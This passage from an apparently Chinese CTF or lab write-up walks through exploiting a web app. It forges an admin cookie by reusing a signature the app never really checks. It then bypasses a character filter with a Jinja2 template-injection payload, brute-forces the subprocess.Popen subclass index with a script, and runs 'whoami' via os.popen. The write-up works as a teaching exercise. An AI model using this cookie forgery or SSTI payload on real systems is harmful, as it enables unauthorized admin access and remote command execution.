7. 利用公钥验证 msg\_hash 与签名数据 sig 是否匹配，具体来说，它会用公钥解密 sig，然后与 msg\_hash 匹配是否一致。

关键的点在于这下面，valid 并不是由校验函数返回的结果，只要前面的校验不抛出异常，valid 就会被设置为 True ：

![](https://changeyourway.github.io/images/image-20250429110444-i6d07q2.png)

所以我们只需要直接将 cookie 里的 name 字段改成 admin 即可

同样抓取一个普通用户的 Cookie ，看一下原始 json 结构：

```
cookie = "eyJ1c2VyX25hbWUiOiAibWlhb2EiLCAibG9naW5fdGltZSI6IDE3NDU4OTUyOTl9JjQ4ZDY1YzE2YjYzMTRiMjAyMDA4YjFhYzE5ZTMyZmU1ZDAzYjQ5NmMxOWFjYjVjNjNjY2UxYjI4ODMwN2MwZTc3NmQ1MzY5ZTdkMTNkNjQwZmY4ZWNjYWQwNWMzOWY0OTdmNGM1YjJjOTE2ZjVjODVkYzAzMGYxYTRjYjhmYTY5ZTRhMGRjYmExOGY2NDM4YjFkOTJiYTEwNWUzYWQyOWM5YTA2YTQwYTc3ZDEzYWMyNjEyMmU5YTcxYjQwZTM4MzRkNzI3ZDRjODE5OGNiYTgwYWI5YWRmMDI0YzZlMTFiMWI3MjVhMzExYTAzMGIyNDRhNmY5M2RiMTRhOWJmZDFiOWE2ZTFlODZhYmE0MjVhMDUwMTVkNjc3YWFjYTZmMTkxM2U2NDhjMmU0YzE3NmQ0Yzk2N2UxMzY1ZGRkZWY1MWJjMGNiODRhYWRhYTUyNGNiZGE1NWQ1N2ZmNzU3MzljYjUyMmI1YmM3N2IyNmFiZWM5MWU5ZmY3MjA1ZTViMTVmNTA5YjI4ZTAxMTY2M2EzYzczNjBkYzY0MWRlZTI1ZmJkYmJjM2E3NjhhY2VhMTZhYTUyNTMzOTgxMjQ5NGQ4ZWNjYzBkNDAwNzRlOGYwNjRkMmNkMWVmMjQ0MmEyOGZjMTliNmI0ZmE4MjYzNzQ5OWQwOGQ0NjlhMTdlY2Vj"

cookie = base64.b64decode(cookie, validate=True).decode()
msg_str, sig_hex = cookie.split("&")
msg_dict = json.loads(msg_str)
msg_str_bytes = msg_str.encode()
msg_hash = SHA256.new(msg_str_bytes)
sig = bytes.fromhex(sig_hex)
print("msg_str：", msg_str)
print("sig_hex：", sig_hex)
```

运行结果：

![](https://changeyourway.github.io/images/image-20250429111014-crdh2h6.png)

那么伪造一个 msg\_str 即可：

```
import base64
import json
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

cookie = "eyJ1c2VyX25hbWUiOiAibWlhb2EiLCAibG9naW5fdGltZSI6IDE3NDU4OTUyOTl9JjQ4ZDY1YzE2YjYzMTRiMjAyMDA4YjFhYzE5ZTMyZmU1ZDAzYjQ5NmMxOWFjYjVjNjNjY2UxYjI4ODMwN2MwZTc3NmQ1MzY5ZTdkMTNkNjQwZmY4ZWNjYWQwNWMzOWY0OTdmNGM1YjJjOTE2ZjVjODVkYzAzMGYxYTRjYjhmYTY5ZTRhMGRjYmExOGY2NDM4YjFkOTJiYTEwNWUzYWQyOWM5YTA2YTQwYTc3ZDEzYWMyNjEyMmU5YTcxYjQwZTM4MzRkNzI3ZDRjODE5OGNiYTgwYWI5YWRmMDI0YzZlMTFiMWI3MjVhMzExYTAzMGIyNDRhNmY5M2RiMTRhOWJmZDFiOWE2ZTFlODZhYmE0MjVhMDUwMTVkNjc3YWFjYTZmMTkxM2U2NDhjMmU0YzE3NmQ0Yzk2N2UxMzY1ZGRkZWY1MWJjMGNiODRhYWRhYTUyNGNiZGE1NWQ1N2ZmNzU3MzljYjUyMmI1YmM3N2IyNmFiZWM5MWU5ZmY3MjA1ZTViMTVmNTA5YjI4ZTAxMTY2M2EzYzczNjBkYzY0MWRlZTI1ZmJkYmJjM2E3NjhhY2VhMTZhYTUyNTMzOTgxMjQ5NGQ4ZWNjYzBkNDAwNzRlOGYwNjRkMmNkMWVmMjQ0MmEyOGZjMTliNmI0ZmE4MjYzNzQ5OWQwOGQ0NjlhMTdlY2Vj"

cookie = base64.b64decode(cookie, validate=True).decode()
msg_str, sig_hex = cookie.split("&")
msg_dict = json.loads(msg_str)
msg_str_bytes = msg_str.encode()
msg_hash = SHA256.new(msg_str_bytes)
sig = bytes.fromhex(sig_hex)
# print("msg_str：", msg_str)
# print("sig_hex：", sig_hex)

msg_str = '{"user_name":"admin","login_time":1745895299}'
msg_str_bytes = msg_str.encode()
msg_hash = SHA256.new(msg_str_bytes)
packed = msg_str + "&" + sig_hex
print(base64.b64encode(packed.encode()).decode())
```

运行结果：

![](https://changeyourway.github.io/images/image-20250429111250-5btizvv.png)

将这个替换调原来的 Cookie ，去访问 /home 路由，可以进到管理员的界面：

![](https://changeyourway.github.io/images/image-20250429111847-u5a2o8e.png)

这里对 payload 做了一些过滤，过滤了 “‘\_#&;” 这些字符：

![](https://changeyourway.github.io/images/image-20250429111935-zo0lags.png)

绕过有很多办法，这里展示一种

由于这里只对参数 payload 做了校验，attr 搭配 request 可以绕过：

```
{{()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()}}&cla=__class__&bas=__base__&sub=__subclasses__
```
![](https://changeyourway.github.io/images/image-20250429134411-kmm8v21.png)

下面写出脚本来获取 subprocess.Popen 的下标：

```
import requests

cookies = {
    "jwbcookie": "eyJ1c2VyX25hbWUiOiJhZG1pbiIsImxvZ2luX3RpbWUiOjE3NDU4OTUyOTl9JjQ4ZDY1YzE2YjYzMTRiMjAyMDA4YjFhYzE5ZTMyZmU1ZDAzYjQ5NmMxOWFjYjVjNjNjY2UxYjI4ODMwN2MwZTc3NmQ1MzY5ZTdkMTNkNjQwZmY4ZWNjYWQwNWMzOWY0OTdmNGM1YjJjOTE2ZjVjODVkYzAzMGYxYTRjYjhmYTY5ZTRhMGRjYmExOGY2NDM4YjFkOTJiYTEwNWUzYWQyOWM5YTA2YTQwYTc3ZDEzYWMyNjEyMmU5YTcxYjQwZTM4MzRkNzI3ZDRjODE5OGNiYTgwYWI5YWRmMDI0YzZlMTFiMWI3MjVhMzExYTAzMGIyNDRhNmY5M2RiMTRhOWJmZDFiOWE2ZTFlODZhYmE0MjVhMDUwMTVkNjc3YWFjYTZmMTkxM2U2NDhjMmU0YzE3NmQ0Yzk2N2UxMzY1ZGRkZWY1MWJjMGNiODRhYWRhYTUyNGNiZGE1NWQ1N2ZmNzU3MzljYjUyMmI1YmM3N2IyNmFiZWM5MWU5ZmY3MjA1ZTViMTVmNTA5YjI4ZTAxMTY2M2EzYzczNjBkYzY0MWRlZTI1ZmJkYmJjM2E3NjhhY2VhMTZhYTUyNTMzOTgxMjQ5NGQ4ZWNjYzBkNDAwNzRlOGYwNjRkMmNkMWVmMjQ0MmEyOGZjMTliNmI0ZmE4MjYzNzQ5OWQwOGQ0NjlhMTdlY2Vj"
}
url = "http://192.168.88.49:5000/home"
for i in range(500):
    data = {"payload": "{{()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.gei)(" + str(i) + ")}}",
            "cla": "__class__",
            "bas": "__base__",
            "sub": "__subclasses__",
            "gei": "__getitem__"
            }
    try:
        response = requests.get(url, params=data, cookies=cookies)
        # print(respose.text)
        if response.status_code == 200:
            if "subprocess.Popen" in response.text:
                print(i)
    except:
        pass
```

这里使用中括号会报语法错误，故使用 `|attr("__getitem__")(i)` 来获取下标 i 。

运行结果：

![](https://changeyourway.github.io/images/image-20250429142739-phzgo9k.png)

那么就可以构造我们的 payload 为：

```
{{()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.gei)(254)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)("os")|attr("popen")("whoami")|attr("read")()}}&cla=__class__&bas=__base__&sub=__subclasses__&gei=__getitem__&ini=__init__&glo=__globals__&gei=__getitem__
```

执行成功：

![](https://changeyourway.github.io/images/image-20250429143810-jof6lu6.png)